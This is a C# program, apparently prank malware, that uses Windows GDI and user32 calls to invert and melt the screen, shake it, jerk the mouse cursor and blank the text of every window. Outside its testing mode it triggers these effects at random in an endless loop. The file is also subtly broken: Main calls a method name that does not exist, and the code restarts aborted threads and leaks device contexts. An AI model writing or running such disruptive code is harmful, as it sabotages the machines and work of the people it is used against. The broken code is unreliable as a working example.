using System;
using System.Threading;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.Collections.Generic;
using System.Drawing;

class Cope
{
    [DllImport("gdi32")]
    static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);

    [DllImport("gdi32")]
    static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, string lpInitData);

    [DllImport("user32")]
    static extern int GetSystemMetrics(int smIndex);

    [DllImport("user32")]
    static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, string lParam);

    [DllImport("user32")]
    static extern IntPtr GetDesktopWindow();

    [DllImport("user32")]
    static extern bool EnumChildWindows(IntPtr hwndParent, EnumWindowsProc lpEnumFunc, string lParam);
	
    [DllImport("user32")]
    static extern bool SetCursorPos(int xDest, int yDest);

    [DllImport("user32")]
    static extern bool GetCursorPos(out Point lpPoint);

    static int width = GetSystemMetrics(0);
    static int height = GetSystemMetrics(1);

    static bool running = false;

    static Random rnd = new Random();

    public delegate bool EnumWindowsProc(IntPtr hWnd, string lParam);
    static bool callback(IntPtr hwnd, string lParam)
    {
        SendMessage(hwnd, 12, IntPtr.Zero, "");
        return true;
    }

    /*

    static void Payload()
    {
        while (running)
        {

        }
        if(running==false) {return;}
    }


    */

    static void Melt()
    {
        int meltingX = rnd.Next(0, width);
        int howMuchToMelt = rnd.Next(0, 30);
        int meltProgress = 0;
        while (running)
        {
            while (meltProgress != howMuchToMelt)
            {
                IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                StretchBlt(hdc, meltingX, meltProgress, 3, height, hdc, meltingX, 0, 3, height, 0x00CC0020);
                meltProgress++;
            }
            meltingX = rnd.Next(0, width);
            howMuchToMelt = rnd.Next(0, 15);
            meltProgress = 0;
        }
        if(running==false){return;}
    }
	
	static void Invert()
	{
		int delay = 5000;
		while (running)
		{
			IntPtr hdc = CreateDC("DISPLAY", null, null, null);
			StretchBlt(hdc, 0, 0, width, height, hdc, 0, 0, width, height, 0x00550009);
			Thread.Sleep(delay);
			delay = 1000;
		}
        if(running==false){return;}
	}

    static void CursorShake()
    {
        while (running)
        {
            Point cursor;
            GetCursorPos(out cursor);
            SetCursorPos(cursor.X + rnd.Next(-3,3), cursor.Y + rnd.Next(-3,3));
			Thread.Sleep(20);
        }
        if(running==false){return;}
    }
	
	static void CursorCrazy()
    {
		int offset = 0;
        while (running)
        {
            Point cursor;
            GetCursorPos(out cursor);
            SetCursorPos(cursor.X + rnd.Next(-offset,offset), cursor.Y + rnd.Next(-offset,offset));
			offset++;
			Thread.Sleep(20);
        }
        if(running==false){return;}
    }

    static void CursorSlow()
    {
        while (running)
        {
            Point cursor;
            GetCursorPos(out cursor);
            SetCursorPos(cursor.X, cursor.Y);
        }
        if(running==false){return;}
    }

    static void CursorCrazy2()
    {
        double offset = 0;
        double offset2 = 0;
        while (running)
        {
            Point cursor;
            GetCursorPos(out cursor);
            double x = Math.Sin(offset + Math.Tan(offset2));
            double y = Math.Cos(offset + Math.Tan(offset2));

            SetCursorPos(cursor.X + (int)(x*20),cursor.Y + (int)(y*20));

            offset+=0.1;
            offset2+=0.01;
            Thread.Sleep(20);
        }
        if(running==false){return;}
    }

    static void ScreenCrazy()
    {
        double offset = 0;
        double offset2 = 0;
        while (running)
        {
            IntPtr hdc = CreateDC("DISPLAY", null, null, null);
            double x = Math.Sin(offset + Math.Tan(offset));
            double y = Math.Cos(offset + Math.Tan(offset));

            StretchBlt(hdc, 0, 0, width, height, hdc, (int)(x*20), (int)(y*20), width, height, 0x00CC0020);

            offset+=0.1;
            offset2+=0.01;
        }
        if(running==false){return;}
    }
	
    static void ScreenMoveY()
    {
        double offset = 0;
        while (running)
        {
            IntPtr hdc = CreateDC("DISPLAY", null, null, null);
            double y = Math.Cos(offset);

            StretchBlt(hdc, 0, 0, width, height, hdc, 0, (int)(y*20), width, height, 0x00CC0020);

            offset+=0.1;
        }
        if(running==false){return;}
    }
	
    static void ScreenMoveX()
    {
        double offset = 0;
        while (running)
        {
            IntPtr hdc = CreateDC("DISPLAY", null, null, null);
            double x = Math.Sin(offset);

            StretchBlt(hdc, 0, 0, width, height, hdc, (int)(x*20), 0, width, height, 0x00CC0020);

            offset+=0.1;
        }
        if(running==false){return;}
    }

    static void ScreenMoveY2()
    {
        double offset = 0;
        double offset2 = 0;
        while (running)
        {
            IntPtr hdc = CreateDC("DISPLAY", null, null, null);
            double y = Math.Cos(offset + Math.Tan(offset));

            StretchBlt(hdc, 0, 0, width, height, hdc, 0, (int)(y*20), width, height, 0x00CC0020);

            offset+=0.1;
            offset2+=0.01;
        }
        if(running==false){return;}
    }
	
    static void ScreenMoveX2()
    {
        double offset = 0;
        double offset2 = 0;
        while (running)
        {
            IntPtr hdc = CreateDC("DISPLAY", null, null, null);
            double x = Math.Sin(offset + Math.Tan(offset));

            StretchBlt(hdc, 0, 0, width, height, hdc, (int)(x*20), 0, width, height, 0x00CC0020);

            offset+=0.1;
            offset2+=0.01;
        }
        if(running==false){return;}
    }

    static void ScreenCircle()
    {
        double offset = 0;
        double offset2 = 0;
        while (running)
        {
            IntPtr hdc = CreateDC("DISPLAY", null, null, null);
            double x = Math.Sin(offset);
            double y = Math.Cos(offset);

            StretchBlt(hdc, 0, 0, width, height, hdc, (int)(x*20), (int)(y*20), width, height, 0x00CC0020);

            offset+=0.1;
            offset2+=0.01;
        }
        if(running==false){return;}
    }

    static void ChangeText()
    {
        Process.Start("C:\\Windows\\System32\\notepad.exe");
        while (running)
        {
            EnumChildWindows(GetDesktopWindow(), callback, null);
        }
        if(running==false){return;}
    }
	
	static Thread[] threads =
	{
        new Thread(Invert),
		new Thread(Melt),
		new Thread(ChangeText),
		new Thread(CursorShake),
		new Thread(CursorCrazy),
        	new Thread(CursorCrazy2),
		new Thread(CursorSlow),
		new Thread(ScreenCrazy),
		new Thread(ScreenMoveX),
		new Thread(ScreenMoveY),
		new Thread(ScreenMoveX2),
		new Thread(ScreenMoveY2)
	};

    static void Main(string[] args)
    {
        bool testing = true;

        if (testing == false)
        {	

            Random rnd = new Random();

            while (true)
            {
                int r = rnd.Next(0,7);
                while (running == false)
                {
                    r = rnd.Next(0,7);
                    foreach (Thread t in threads)
    				{
                        Console.WriteLine(t.IsAlive);
    					if(r == rnd.Next(0,7)){running=true;t.Start();break;}
    				}
                }
                Thread.Sleep(60000*5);
                running = false;
                Thread.Sleep(30000);
                foreach (Thread t in threads)
                {
                    if(t.IsAlive){t.Abort();}
                }
            }
        }
        else
        {
            running = true;
            screenMoveY2();
        }


    }
}
